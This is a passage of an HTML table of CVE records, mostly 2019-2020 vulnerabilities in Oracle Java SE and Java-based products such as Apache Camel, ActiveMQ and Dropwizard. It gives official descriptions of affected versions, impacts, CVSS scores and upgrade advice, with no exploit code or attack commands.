		<td valign="top">Vulnerability in the Java SE, Java SE Embedded product of Oracle Java SE (component: Libraries). Supported versions that are affected are Java SE: 7u261 and 8u251; Java SE Embedded: 8u251. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Java SE Embedded. Note: Applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.1 Base Score 3.7 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-14577">CVE-2020-14577</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded product of Oracle Java SE (component: JSSE). Supported versions that are affected are Java SE: 7u261, 8u251, 11.0.7 and 14.0.1; Java SE Embedded: 8u251. Difficult to exploit vulnerability allows unauthenticated attacker with network access via TLS to compromise Java SE, Java SE Embedded. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Java SE, Java SE Embedded accessible data. Note: Applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.1 Base Score 3.7 (Confidentiality impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-14573">CVE-2020-14573</a></td>
		<td valign="top">Vulnerability in the Java SE product of Oracle Java SE (component: Hotspot). Supported versions that are affected are Java SE: 11.0.7 and 14.0.1. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Java SE accessible data. Note: Applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.1 Base Score 3.7 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-14562">CVE-2020-14562</a></td>
		<td valign="top">Vulnerability in the Java SE product of Oracle Java SE (component: ImageIO). Supported versions that are affected are Java SE: 11.0.7 and 14.0.1. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-14556">CVE-2020-14556</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded product of Oracle Java SE (component: Libraries). Supported versions that are affected are Java SE: 8u251, 11.0.7 and 14.0.1; Java SE Embedded: 8u251. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Java SE, Java SE Embedded accessible data as well as unauthorized read access to a subset of Java SE, Java SE Embedded accessible data. Note: Applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.1 Base Score 4.8 (Confidentiality and Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-14307">CVE-2020-14307</a></td>
		<td valign="top">A vulnerability was found in Wildfly's Enterprise Java Beans (EJB) versions shipped with Red Hat JBoss EAP 7, where SessionOpenInvocations are never removed from the remote InvocationTracker after a response is received in the EJB Client, as well as the server. This flaw allows an attacker to craft a denial of service attack to make the service unavailable.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-13956">CVE-2020-13956</a></td>
		<td valign="top">Apache HttpClient versions prior to version 4.5.13 and 5.0.3 can misinterpret malformed authority component in request URIs passed to the library as java.net.URI object and pick the wrong target host for request execution.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-13936">CVE-2020-13936</a></td>
		<td valign="top">An attacker that is able to modify Velocity templates may execute arbitrary Java code or run arbitrary system commands with the same privileges as the account running the Servlet container. This applies to applications that allow untrusted users to upload/modify velocity templates running Apache Velocity Engine versions up to 2.2.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-13651">CVE-2020-13651</a></td>
		<td valign="top">An issue was discovered in DigDash 2018R2 before p20200528, 2019R1 before p20200421, and 2019R2 before p20200430. It allows a user to provide data that will be used to generate the JNLP file used by a client to obtain the right Java application. By providing an attacker-controlled URL, the client will obtain a rogue JNLP file specifying the installation of malicious JAR archives and executed with full privileges on the client computer.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-12873">CVE-2020-12873</a></td>
		<td valign="top">An issue was discovered in Alfresco Enterprise Content Management (ECM) before 6.2.1. A user with privileges to edit a FreeMarker template (e.g., a webscript) may execute arbitrary Java code or run arbitrary system commands with the same privileges as the account running Alfresco.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-12835">CVE-2020-12835</a></td>
		<td valign="top">An issue was discovered in SmartBear ReadyAPI SoapUI Pro 3.2.5. Due to unsafe use of an Java RMI based protocol in an unsafe configuration, an attacker can inject malicious serialized objects into the communication, resulting in remote code execution in the context of a client-side Network Licensing Protocol component.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-12760">CVE-2020-12760</a></td>
		<td valign="top">An issue was discovered in OpenNMS Horizon before 26.0.1, and Meridian before 2018.1.19 and 2019 before 2019.1.7. The ActiveMQ channel configuration allowed for arbitrary deserialization of Java objects (aka ActiveMQ Minion payload deserialization), leading to remote code execution for any authenticated channel user regardless of its assigned permissions.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-12676">CVE-2020-12676</a></td>
		<td valign="top">FusionAuth fusionauth-samlv2 0.2.3 allows remote attackers to forge messages and bypass authentication via a SAML assertion that lacks a Signature element, aka a "Signature exclusion attack".

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-12668">CVE-2020-12668</a></td>
		<td valign="top">Jinjava before 2.5.4 allow access to arbitrary classes by calling Java methods on objects passed into a Jinjava context. This could allow for abuse of the application class loader, including Arbitrary File Disclosure.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-12133">CVE-2020-12133</a></td>
		<td valign="top">The Apros Evolution, ConsciusMap, and Furukawa provisioning systems through 2.8.1 allow remote code execution because of javax.faces.ViewState Java deserialization.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-11998">CVE-2020-11998</a></td>
		<td valign="top">A regression has been introduced in the commit preventing JMX re-bind. By passing an empty environment map to RMIConnectorServer, instead of the map that contains the authentication credentials, it leaves ActiveMQ open to the following attack: https://docs.oracle.com/javase/8/docs/technotes/guides/management/agent.html "A remote client could create a javax.management.loading.MLet MBean and use it to create new MBeans from arbitrary URLs, at least if there is no security manager. In other words, a rogue remote client could make your Java application execute arbitrary code." Mitigation: Upgrade to Apache ActiveMQ 5.15.13

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-11975">CVE-2020-11975</a></td>
		<td valign="top">Apache Unomi allows conditions to use OGNL scripting which offers the possibility to call static Java classes from the JDK that could execute code with the permission level of the running Java process.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-11973">CVE-2020-11973</a></td>
		<td valign="top">Apache Camel Netty enables Java deserialization by default. Apache Camel 2.22.x, 2.23.x, 2.24.x, 2.25.0, 3.0.0 up to 3.1.0 are affected. 2.x users should upgrade to 2.25.1, 3.x users should upgrade to 3.2.0.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-11972">CVE-2020-11972</a></td>
		<td valign="top">Apache Camel RabbitMQ enables Java deserialization by default. Apache Camel 2.22.x, 2.23.x, 2.24.x, 2.25.0, 3.0.0 up to 3.1.0 are affected. 2.x users should upgrade to 2.25.1, 3.x users should upgrade to 3.2.0.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-11050">CVE-2020-11050</a></td>
		<td valign="top">In Java-WebSocket less than or equal to 1.4.1, there is an Improper Validation of Certificate with Host Mismatch where WebSocketClient does not perform SSL hostname validation. This has been patched in 1.5.0.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-11002">CVE-2020-11002</a></td>
		<td valign="top">dropwizard-validation before versions 2.0.3 and 1.3.21 has a remote code execution vulnerability. A server-side template injection was identified in the self-validating feature enabling attackers to inject arbitrary Java EL expressions, leading to Remote Code Execution (RCE) vulnerability. If you are using a self-validating bean an upgrade to Dropwizard 1.3.21/2.0.3 or later is strongly recommended. The changes introduced in Dropwizard 1.3.19 and 2.0.2 for CVE-2020-5245 unfortunately did not fix the underlying issue completely. The issue has been fixed in dropwizard-validation 1.3.21 and 2.0.3 or later. We strongly recommend upgrading to one of these versions.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-10290">CVE-2020-10290</a></td>
		<td valign="top">Universal Robots controller execute URCaps (zip files containing Java-powered applications) without any permission restrictions and a wide API that presents many primitives that can compromise the overall robot operations as demonstrated in our video. In our PoC we demonstrate how a malicious actor could 'cook' a custom URCap that when deployed by the user (intendedly or unintendedly) compromises the system

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2020-0293">CVE-2020-0293</a></td>
		<td valign="top">In Java network APIs, there is possible access to sensitive network state due to a missing permission check. This could lead to local information disclosure with no additional execution privileges needed. User interaction is not needed for exploitation in Android versions: Android-11, Android ID: A-141455849

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-9624">CVE-2019-9624</a></td>
		<td valign="top">Webmin 1.900 allows remote attackers to execute arbitrary code by leveraging the "Java file manager" and "Upload and Download" privileges to upload a crafted .cgi file via the /updown/upload.cgi URI.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-5326">CVE-2019-5326</a></td>
		<td valign="top">An administrative application user of or application user with write access to Aruba Airwave VisualRF is able to obtain code execution on the AMP platform. This is possible due to the ability to overwrite a file on disk which is subsequently deserialized by the Java application component.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-5312">CVE-2019-5312</a></td>
		<td valign="top">An issue was discovered in weixin-java-tools v3.3.0. There is an XXE vulnerability in the getXmlDoc method of the BaseWxPayResult.java file. NOTE: this issue exists because of an incomplete fix for CVE-2018-20318.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-4732">CVE-2019-4732</a></td>
		<td valign="top">IBM SDK, Java Technology Edition Version 7.0.0.0 through 7.0.10.55, 7.1.0.0 through 7.1.4.55, and 8.0.0.0 through 8.0.6.0 could allow a local authenticated attacker to execute arbitrary code on the system, caused by DLL search order hijacking vulnerability in Microsoft Windows client. By placing a specially-crafted file in a compromised folder, an attacker could exploit this vulnerability to execute arbitrary code on the system. IBM X-Force ID: 172618.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-4473">CVE-2019-4473</a></td>
		<td valign="top">Multiple binaries in IBM SDK, Java Technology Edition 7, 7R, and 8 on the AIX platform use insecure absolute RPATHs, which may facilitate code injection and privilege elevation by local users. IBM X-Force ID: 163984.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-3801">CVE-2019-3801</a></td>
		<td valign="top">Cloud Foundry cf-deployment, versions prior to 7.9.0, contain java components that are using an insecure protocol to fetch dependencies when building. A remote unauthenticated malicious attacker could hijack the DNS entry for the dependency, and inject malicious code into the component.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-3559">CVE-2019-3559</a></td>
		<td valign="top">Java Facebook Thrift servers would not error upon receiving messages with containers of fields of unknown type. As a result, malicious clients could send short messages which would take a long time for the server to parse, potentially leading to denial of service. This issue affects Facebook Thrift prior to v2019.02.18.00.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-2999">CVE-2019-2999</a></td>
		<td valign="top">Vulnerability in the Java SE product of Oracle Java SE (component: Javadoc). Supported versions that are affected are Java SE: 7u231, 8u221, 11.0.4 and 13. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java SE, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Java SE accessible data as well as unauthorized read access to a subset of Java SE accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets (in Java SE 8), that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 4.7 (Confidentiality and Integrity impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-2996">CVE-2019-2996</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded product of Oracle Java SE (component: Deployment). The supported version that is affected is Java SE: 8u221; Java SE Embedded: 8u221. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Java SE, Java SE Embedded accessible data as well as unauthorized read access to a subset of Java SE, Java SE Embedded accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets (in Java SE 8), that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 4.2 (Confidentiality and Integrity impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-2992">CVE-2019-2992</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded product of Oracle Java SE (component: 2D). Supported versions that are affected are Java SE: 7u231, 8u221, 11.0.4 and 13; Java SE Embedded: 8u221. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Java SE Embedded. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets (in Java SE 8), that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 3.7 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-2989">CVE-2019-2989</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded product of Oracle Java SE (component: Networking). Supported versions that are affected are Java SE: 7u231, 8u221, 11.0.4 and 13; Java SE Embedded: 8u221. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. While the vulnerability is in Java SE, Java SE Embedded, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in unauthorized creation, deletion or modification access to critical data or all Java SE, Java SE Embedded accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets (in Java SE 8), that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS v3.0 Base Score 6.8 (Integrity impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:C/C:N/I:H/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-2988">CVE-2019-2988</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded product of Oracle Java SE (component: 2D). Supported versions that are affected are Java SE: 7u231, 8u221, 11.0.4 and 13; Java SE Embedded: 8u221. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Java SE Embedded. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets (in Java SE 8), that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 3.7 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-2987">CVE-2019-2987</a></td>
		<td valign="top">Vulnerability in the Java SE product of Oracle Java SE (component: 2D). Supported versions that are affected are Java SE: 11.0.4 and 13. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets (in Java SE 8), that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.0 Base Score 3.7 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-2983">CVE-2019-2983</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded product of Oracle Java SE (component: Serialization). Supported versions that are affected are Java SE: 7u231, 8u221, 11.0.4 and 13; Java SE Embedded: 8u221. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Java SE Embedded. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets (in Java SE 8), that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.0 Base Score 3.7 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-2981">CVE-2019-2981</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded product of Oracle Java SE (component: JAXP). Supported versions that are affected are Java SE: 7u231, 8u221, 11.0.4 and 13; Java SE Embedded: 8u221. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Java SE Embedded. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets (in Java SE 8), that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.0 Base Score 3.7 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-2978">CVE-2019-2978</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded product of Oracle Java SE (component: Networking). Supported versions that are affected are Java SE: 7u231, 8u221, 11.0.4 and 13; Java SE Embedded: 8u221. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Java SE Embedded. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets (in Java SE 8), that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.0 Base Score 3.7 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-2977">CVE-2019-2977</a></td>
		<td valign="top">Vulnerability in the Java SE product of Oracle Java SE (component: Hotspot). Supported versions that are affected are Java SE: 11.0.4 and 13. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Java SE accessible data and unauthorized ability to cause a partial denial of service (partial DOS) of Java SE. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets (in Java SE 8), that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 4.8 (Confidentiality and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-2975">CVE-2019-2975</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded product of Oracle Java SE (component: Scripting). Supported versions that are affected are Java SE: 8u221, 11.0.4 and 13; Java SE Embedded: 8u221. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Java SE, Java SE Embedded accessible data and unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Java SE Embedded. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets (in Java SE 8), that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.0 Base Score 4.8 (Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-2973">CVE-2019-2973</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded product of Oracle Java SE (component: JAXP). Supported versions that are affected are Java SE: 7u231, 8u221, 11.0.4 and 13; Java SE Embedded: 8u221. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Java SE Embedded. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets (in Java SE 8), that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.0 Base Score 3.7 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-2964">CVE-2019-2964</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded product of Oracle Java SE (component: Concurrency). Supported versions that are affected are Java SE: 7u231, 8u221, 11.0.4 and 13; Java SE Embedded: 8u221. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Java SE Embedded. Note: This vulnerability can only be exploited by supplying data to APIs in the specified Component without using Untrusted Java Web Start applications or Untrusted Java applets, such as through a web service. CVSS 3.0 Base Score 3.7 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-2962">CVE-2019-2962</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded product of Oracle Java SE (component: 2D). Supported versions that are affected are Java SE: 7u231, 8u221, 11.0.4 and 13; Java SE Embedded: 8u221. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Java SE Embedded. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets (in Java SE 8), that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.0 Base Score 3.7 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-2958">CVE-2019-2958</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded product of Oracle Java SE (component: Libraries). Supported versions that are affected are Java SE: 7u231, 8u221, 11.0.4 and 13; Java SE Embedded: 8u221. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks of this vulnerability can result in unauthorized creation, deletion or modification access to critical data or all Java SE, Java SE Embedded accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets (in Java SE 8), that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.0 Base Score 5.9 (Integrity impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-2949">CVE-2019-2949</a></td>
